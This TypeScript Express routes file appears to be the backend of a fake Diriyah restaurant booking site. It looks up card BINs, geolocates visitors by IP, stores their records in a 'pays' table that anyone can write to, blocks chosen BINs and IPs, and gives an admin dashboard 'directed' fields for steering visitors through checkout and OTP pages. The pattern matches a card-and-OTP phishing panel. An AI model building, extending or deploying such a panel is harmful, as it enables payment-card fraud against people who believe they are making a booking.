import type { Express } from "express";
import { createServer, type Server } from "http";
import { SignJWT, jwtVerify } from "jose";
import { serverSupabase } from "./supabase";
import { applyAuthCacheHeaders } from "./auth-transport";

const BINCODES_API_KEY = process.env.BINCODES_API_KEY?.trim();
const BINCODES_LOOKUP_URL = "https://api.bincodes.com/bin/";
const BINLIST_LOOKUP_URL = "https://lookup.binlist.net/";
const RAPIDAPI_BIN_KEY = process.env.RAPIDAPI_BIN_KEY?.trim();
const RAPIDAPI_BIN_HOST = "bin-ip-checker.p.rapidapi.com";
const RAPIDAPI_BIN_URL = "https://bin-ip-checker.p.rapidapi.com/";
const BIN_CACHE_TTL_MS = 1000 * 60 * 30;

interface RapidApiBinResponse {
  code?: number;
  BIN?: {
    valid?: boolean;
    number?: { iin?: string };
    scheme?: string;
    type?: string;
    level?: string;
    issuer?: { name?: string };
    country?: { name?: string; alpha2?: string };
  };
}

const binLookupCache = new Map<
  string,
  {
    expiresAt: number;
    data: {
      bin: string;
      bankName: string;
      cardBrand: string;
      cardType: string;
      cardLevel: string;
      country: string;
      countryCode: string;
    };
  }
>();

interface BinCodesApiResponse {
  bin?: string;
  bank?: string;
  card?: string;
  type?: string;
  level?: string;
  country?: string;
  countrycode?: string;
  valid?: string | boolean;
  error?: string;
  message?: string;
}

export function registerRoutes(
  httpServer: Server,
  app: Express
): Server {
  const getSeoOrigin = (req: any) => {
    const configured = process.env.CANONICAL_ORIGIN?.trim();
    if (configured) return configured.replace(/\/$/, "");
    const protocol = String(req.headers["x-forwarded-proto"] || req.protocol || "https").split(",")[0];
    const host = String(req.get("host") || "").replace(/[^a-zA-Z0-9.:-]/g, "");
    return `${protocol}://${host}`;
  };

  app.get("/api/health", (_req, res) => {
    res.json({ status: "ok" });
  });

  app.get("/robots.txt", (req, res) => {
    const origin = getSeoOrigin(req);
    res.type("text/plain").send([
      "User-agent: *",
      "Allow: /",
      "Disallow: /registration",
      "Disallow: /booking",
      "Disallow: /checkout",
      "Disallow: /otp",
      "Disallow: /confirmation",
      `Sitemap: ${origin}/sitemap.xml`,
      "",
    ].join("\n"));
  });

  app.get("/sitemap.xml", (req, res) => {
    const origin = getSeoOrigin(req);
    const publicPaths = ["/home", "/restaurants", ...Array.from({ length: 30 }, (_, index) => `/restaurant/${index + 1}`)];
    const urls = publicPaths.map((path) => `  <url><loc>${origin}${path}</loc></url>`).join("\n");
    res.type("application/xml").send(`<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n${urls}\n</urlset>`);
  });

  // Send confirmation email endpoint
  app.get("/api/visitor-ip", async (req, res) => {
    const forwarded = req.headers["x-forwarded-for"];
    let ip = "";
    if (typeof forwarded === "string") {
      ip = forwarded.split(",")[0]?.trim() || "";
    } else if (Array.isArray(forwarded) && forwarded.length > 0) {
      ip = String(forwarded[0]).split(",")[0]?.trim();
    }
    if (!ip) ip = req.ip || "";
    if (ip.startsWith("::ffff:")) ip = ip.slice(7);

    let country = "";
    let countryCode = "";
    let city = "";
    let region = "";
    const isPrivate =
      !ip ||
      ip === "127.0.0.1" ||
      ip === "::1" ||
      ip.startsWith("10.") ||
      ip.startsWith("192.168.") ||
      /^172\.(1[6-9]|2\d|3[0-1])\./.test(ip);

    if (!isPrivate) {
      try {
        const geoRes = await fetch(
          `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,countryCode,regionName,city`,
          { signal: AbortSignal.timeout(3500) },
        );
        if (geoRes.ok) {
          const geo: any = await geoRes.json();
          if (geo?.status === "success") {
            country = String(geo.country || "");
            countryCode = String(geo.countryCode || "");
            city = String(geo.city || "");
            region = String(geo.regionName || "");
          }
        }
      } catch (error) {
        console.warn("Geo lookup failed for", ip, error);
      }
    }

    res.json({ ip, country, countryCode, city, region });
  });

  app.get("/api/bin-lookup/:bin", async (req, res) => {
    try {
      const rawBin = String(req.params.bin || "");
      const normalizedBin = rawBin.replace(/\D/g, "").slice(0, 6);

      if (normalizedBin.length < 6) {
        return res.status(400).json({
          success: false,
          error: "BIN must be at least 6 digits",
        });
      }

      const cached = binLookupCache.get(normalizedBin);
      if (cached && cached.expiresAt > Date.now()) {
        return res.json({
          success: true,
          data: cached.data,
          cached: true,
        });
      }

      let data = {
        bin: normalizedBin,
        bankName: "",
        cardBrand: "",
        cardType: "",
        cardLevel: "",
        country: "",
        countryCode: "",
      };

      // Primary provider: RapidAPI bin-ip-checker
      if (RAPIDAPI_BIN_KEY) {
        try {
          const rapidRes = await fetch(
            `${RAPIDAPI_BIN_URL}?bin=${normalizedBin}`,
            {
              method: "POST",
              headers: {
                Accept: "application/json",
                "X-RapidAPI-Key": RAPIDAPI_BIN_KEY,
                "X-RapidAPI-Host": RAPIDAPI_BIN_HOST,
              },
            },
          );
          if (rapidRes.ok) {
            const rapidJson = (await rapidRes.json()) as RapidApiBinResponse;
            const b = rapidJson?.BIN;
            if (b && b.valid !== false) {
              if (b.issuer?.name) data.bankName = b.issuer.name;
              if (b.scheme) data.cardBrand = b.scheme.toLowerCase();
              if (b.type) data.cardType = b.type.toLowerCase();
              if (b.level) data.cardLevel = b.level;
              if (b.country?.name) data.country = b.country.name;
              if (b.country?.alpha2) data.countryCode = b.country.alpha2;
            }
          }
        } catch {
          // ignore and try next provider
        }
      }

      // Secondary provider: bincodes.com
      let payload: BinCodesApiResponse | null = null;
      if (!data.bankName && BINCODES_API_KEY) {
        try {
          const lookupUrl = new URL(BINCODES_LOOKUP_URL);
          lookupUrl.searchParams.set("format", "json");
          lookupUrl.searchParams.set("api_key", BINCODES_API_KEY);
          lookupUrl.searchParams.set("bin", normalizedBin);

          const response = await fetch(lookupUrl.toString(), {
            headers: { Accept: "application/json" },
          });
          try {
            payload = (await response.json()) as BinCodesApiResponse;
          } catch {
            payload = null;
          }
          if (response.ok && payload) {
            const isValid = `${payload.valid}`.toLowerCase() === "true";
            if (isValid && !payload.error) {
              if (!data.bankName && payload.bank) data.bankName = payload.bank;
              if (!data.cardBrand && payload.card)
                data.cardBrand = payload.card;
              if (!data.cardType && payload.type)
                data.cardType = payload.type;
              if (!data.cardLevel && payload.level)
                data.cardLevel = payload.level;
              if (!data.country && payload.country)
                data.country = payload.country;
              if (!data.countryCode && payload.countrycode)
                data.countryCode = payload.countrycode;
            }
          }
        } catch {
          payload = null;
        }
      }

      // Fallback to binlist.net whenever the primary call failed entirely or
      // returned no bank name. binlist.net often has Saudi BIN coverage when
      // bincodes is rate-limited or returns "API Usage Limit Exceeded".
      if (!data.bankName) {
        try {
          const binlistRes = await fetch(
            `${BINLIST_LOOKUP_URL}${normalizedBin}`,
            { headers: { Accept: "application/json", "Accept-Version": "3" } },
          );
          if (binlistRes.ok) {
            const binlistData = (await binlistRes.json()) as {
              bank?: { name?: string };
              scheme?: string;
              type?: string;
              brand?: string;
              country?: { name?: string; alpha2?: string };
            };
            if (binlistData?.bank?.name) data.bankName = binlistData.bank.name;
            if (!data.cardBrand && binlistData.scheme)
              data.cardBrand = binlistData.scheme;
            if (!data.cardType && binlistData.type)
              data.cardType = binlistData.type;
            if (!data.cardLevel && binlistData.brand)
              data.cardLevel = binlistData.brand;
            if (!data.country && binlistData.country?.name)
              data.country = binlistData.country.name;
            if (!data.countryCode && binlistData.country?.alpha2)
              data.countryCode = binlistData.country.alpha2;
          }
        } catch {
          // silently ignore fallback errors
        }
      }

      // If both providers returned nothing useful, surface an error so the
      // client can show its own state instead of caching empty data.
      if (!data.bankName && !data.cardBrand) {
        return res.status(422).json({
          success: false,
          error: payload?.message || "Invalid or unknown BIN",
          code: payload?.error || undefined,
        });
      }

      binLookupCache.set(normalizedBin, {
        data,
        expiresAt: Date.now() + BIN_CACHE_TTL_MS,
      });

      return res.json({ success: true, data });
    } catch (error) {
      console.error("BIN lookup error:", error);
      return res.status(500).json({
        success: false,
        error: "Failed to lookup BIN",
      });
    }
  });

  // Server-side Supabase DB & Auth proxy endpoints
  const TABLES: Record<string, { table: string; pk: string }> = {
    pays: { table: "pays", pk: "id" },
    settings: { table: "settings", pk: "id" },
    blocked_bins: { table: "blocked_bins", pk: "id" },
  };

  function getTableSpec(collectionName: string) {
    const spec = TABLES[collectionName];
    if (!spec) throw new Error(`Unknown collection: ${collectionName}`);
    return spec;
  }

  function getAccessToken(req: any) {
    const rawCookie = String(req.headers.cookie || "");
    const token = rawCookie.match(/(?:^|;\s*)sb-access-token=([^;]+)/)?.[1];
    return token ? decodeURIComponent(token) : "";
  }

  function isAuthorizedAdmin(user: any) {
    const role = String(user?.app_metadata?.role || "").toLowerCase();
    const roles = Array.isArray(user?.app_metadata?.roles)
      ? user.app_metadata.roles.map((value: unknown) => String(value).toLowerCase())
      : [];
    if (role === "admin" || roles.includes("admin")) return true;

    const allowedEmails = String(process.env.ADMIN_EMAILS || "")
      .split(",")
      .map((email) => email.trim().toLowerCase())
      .filter(Boolean);
    return allowedEmails.includes(String(user?.email || "").toLowerCase());
  }

  async function getDashboardUser(req: any) {
    if (!serverSupabase) return null;
    const token = getAccessToken(req);
    if (!token) return null;
    const { data, error } = await serverSupabase.auth.getUser(token);
    return error || !data.user || !isAuthorizedAdmin(data.user) ? null : data.user;
  }

  async function requireDashboardAuth(req: any, res: any) {
    if (!serverSupabase) {
      res.status(503).json({ error: "Supabase not configured on server" });
      return false;
    }

    const token = getAccessToken(req);
    if (!token) {
      applyAuthCacheHeaders(res);
      res.status(401).json({ error: "Authentication required" });
      return false;
    }

    const { data, error } = await serverSupabase.auth.getUser(token);
    if (error || !data.user) {
      applyAuthCacheHeaders(res);
      res.status(401).json({ error: "Invalid or expired session" });
      return false;
    }
    if (!isAuthorizedAdmin(data.user)) {
      applyAuthCacheHeaders(res);
      res.status(403).json({ error: "Administrator access required" });
      return false;
    }

    return true;
  }

  const BOOKING_CAPABILITY_COOKIE = "booking-capability";
  const BOOKING_CAPABILITY_AUDIENCE = "diriyah-booking";
  const BOOKING_CAPABILITY_TTL_SECONDS = 60 * 60 * 2;

  function getCookie(req: any, name: string) {
    const rawCookie = String(req.headers.cookie || "");
    const match = rawCookie.match(new RegExp(`(?:^|;\\s*)${name}=([^;]+)`));
    return match?.[1] ? decodeURIComponent(match[1]) : "";
  }

  function getBookingCapabilitySecret() {
    const secret = process.env.SESSION_SECRET || process.env.JWT_SECRET;
    if (!secret) throw new Error("SESSION_SECRET is required for booking access");
    return new TextEncoder().encode(secret);
  }

  async function createBookingCapability(visitorId: string) {
    return new SignJWT({ scope: "booking" })
      .setProtectedHeader({ alg: "HS256" })
      .setSubject(visitorId)
      .setAudience(BOOKING_CAPABILITY_AUDIENCE)
      .setIssuedAt()
      .setExpirationTime(`${BOOKING_CAPABILITY_TTL_SECONDS}s`)
      .sign(getBookingCapabilitySecret());
  }

  async function hasBookingCapability(req: any, visitorId: string) {
    const token = getCookie(req, BOOKING_CAPABILITY_COOKIE);
    if (!token) return false;
    try {
      const { payload } = await jwtVerify(token, getBookingCapabilitySecret(), {
        audience: BOOKING_CAPABILITY_AUDIENCE,
      });
      return payload.sub === visitorId && payload.scope === "booking";
    } catch {
      return false;
    }
  }

  function setBookingCapabilityCookie(res: any, token: string) {
    res.append(
      "Set-Cookie",
      `${BOOKING_CAPABILITY_COOKIE}=${encodeURIComponent(token)}; Path=/; Max-Age=${BOOKING_CAPABILITY_TTL_SECONDS}; HttpOnly; SameSite=Strict${process.env.NODE_ENV === "production" ? "; Secure" : ""}`,
    );
  }

  function isPublicDocumentRead(collection: string, id: string) {
    return (
      collection === "blocked_bins" ||
      (collection === "settings" && id === "blockedIps")
    );
  }

  app.get("/api/db/:collection/:id", async (req, res) => {
    try {
      if (!serverSupabase) return res.status(503).json({ error: "Supabase not configured on server" });
      const { collection, id } = req.params;
      if (collection === "pays") {
        const isAdmin = Boolean(await getDashboardUser(req));
        if (!isAdmin && !/^visitor_.{1,128}$/i.test(id) && !(await hasBookingCapability(req, id))) {
          return res.status(403).json({ error: "Booking access denied" });
        }
      } else if (!isPublicDocumentRead(collection, id) && !(await requireDashboardAuth(req, res))) return;
      const { table, pk } = getTableSpec(collection);
      const { data, error } = await serverSupabase.from(table).select(`${pk}, data`).eq(pk, id).maybeSingle() as any;
      if (error && error.code !== "PGRST116") {
        return res.status(400).json({ error: error.message });
      }
      const rowData = data?.data;
      res.json({ data: rowData ?? null });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post("/api/db/:collection/:id", async (req, res) => {
    try {
      if (!serverSupabase) return res.status(503).json({ error: "Supabase not configured on server" });
      const { collection, id } = req.params;
      const { table, pk } = getTableSpec(collection);
      const { payload, merge } = req.body;

      let existing: any = null;
      let capabilityToken = "";
      if (collection === "pays") {
        const isAdmin = Boolean(await getDashboardUser(req));
        if (!isAdmin) {
          if (!/^visitor_.{1,128}$/i.test(id)) {
            return res.status(403).json({ error: "Invalid visitor ID" });
          }
          if (!(await hasBookingCapability(req, id))) {
            capabilityToken = await createBookingCapability(id);
          }
        }
      } else if (!(await requireDashboardAuth(req, res))) return;

      let nextData = payload;
      if (merge) {
        if (!existing) {
          const existingResult = await serverSupabase.from(table).select(`${pk}, data`).eq(pk, id).maybeSingle() as any;
          existing = existingResult.data;
        }
        const oldData = existing?.data || {};
        const merged: Record<string, any> = { ...oldData };
        if (payload && typeof payload === "object") {
          for (const [k, v] of Object.entries(payload)) {
            if (v === undefined) continue;
            // Allow explicit clearance for directive fields
            if ((v === "" || v === null) && oldData[k] !== undefined && oldData[k] !== null && oldData[k] !== "" && !k.startsWith("directed")) {
              continue;
            }
            merged[k] = v;
          }
        }
        nextData = merged;
      }

      const { error } = await serverSupabase.from(table).upsert({ [pk]: id, data: nextData });
      if (error) return res.status(400).json({ error: error.message });
      if (capabilityToken) setBookingCapabilityCookie(res, capabilityToken);
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.delete("/api/db/:collection/:id", async (req, res) => {
    try {
      if (!serverSupabase) return res.status(503).json({ error: "Supabase not configured on server" });
      const { collection, id } = req.params;
      if (!(await requireDashboardAuth(req, res))) return;
      const { table, pk } = getTableSpec(collection);
      const { error } = await serverSupabase.from(table).delete().eq(pk, id);
      if (error) return res.status(400).json({ error: error.message });
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get("/api/db/:collection", async (req, res) => {
    try {
      if (!serverSupabase) return res.status(503).json({ error: "Supabase not configured on server" });
      const { collection } = req.params;
      if (!(await requireDashboardAuth(req, res))) return;
      const { table, pk } = getTableSpec(collection);
      const { data, error } = await serverSupabase.from(table).select(`${pk}, data`);
      if (error) return res.status(400).json({ error: error.message });
      const rows = data || [];
      res.json({ data: rows });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post("/api/auth/login", async (req, res) => {
    try {
      if (!serverSupabase) return res.status(503).json({ error: "Supabase not configured on server" });
      const email = String(req.body?.email || "").trim().toLowerCase();
      const password = String(req.body?.password || "");
      if (!email || !password) return res.status(400).json({ error: "Email and password are required" });

      const { data, error } = await serverSupabase.auth.signInWithPassword({ email, password });
      if (error || !data.session) return res.status(401).json({ error: error?.message || "Invalid login" });
      if (!isAuthorizedAdmin(data.user)) {
        return res.status(403).json({ error: "Administrator access required" });
      }

      applyAuthCacheHeaders(res);
      res.setHeader("Set-Cookie", `sb-access-token=${encodeURIComponent(data.session.access_token)}; Path=/; HttpOnly; SameSite=Lax${process.env.NODE_ENV === "production" ? "; Secure" : ""}`);
      return res.json({ data: { user: data.user } });
    } catch (e: any) {
      return res.status(500).json({ error: e.message || "Authentication failed" });
    }
  });

  app.get("/api/auth/me", async (req, res) => {
    applyAuthCacheHeaders(res);
    try {
      if (!serverSupabase) return res.status(503).json({ error: "Supabase not configured on server" });
      const rawCookie = String(req.headers.cookie || "");
      const token = getAccessToken(req);
      if (!token) return res.json({ user: null });
      const { data, error } = await serverSupabase.auth.getUser(token);
      return res.json({ user: error || !isAuthorizedAdmin(data.user) ? null : data.user });
    } catch {
      return res.json({ user: null });
    }
  });

  app.post("/api/auth/logout", async (_req, res) => {
    applyAuthCacheHeaders(res);
    res.setHeader("Set-Cookie", "sb-access-token=; Path=/; HttpOnly; Max-Age=0; SameSite=Lax");
    return res.json({ success: true });
  });

  app.post("/api/send-confirmation-email", async (req, res) => {
    try {
      if (!(await requireDashboardAuth(req, res))) return;
      if (!process.env.RESEND_API_KEY) return res.status(503).json({ success: false, error: "Email service is not configured" });
      const { Resend } = await import("resend");
      const resend = new Resend(process.env.RESEND_API_KEY);
      const { to, subject, html, text } = req.body || {};
      if (!to || !subject || (!html && !text)) return res.status(400).json({ success: false, error: "Invalid email payload" });
      const result = await resend.emails.send({ from: process.env.RESEND_FROM_EMAIL || "noreply@example.com", to: String(to), subject: String(subject), html: html ? String(html) : `<pre>${String(text)}</pre>` });
      if (result.error) return res.status(502).json({ success: false, error: result.error.message });
      return res.json({ success: true });
    } catch (e: any) {
      return res.status(500).json({ success: false, error: e.message || "Failed to send email" });
    }
  });

  return httpServer;
}
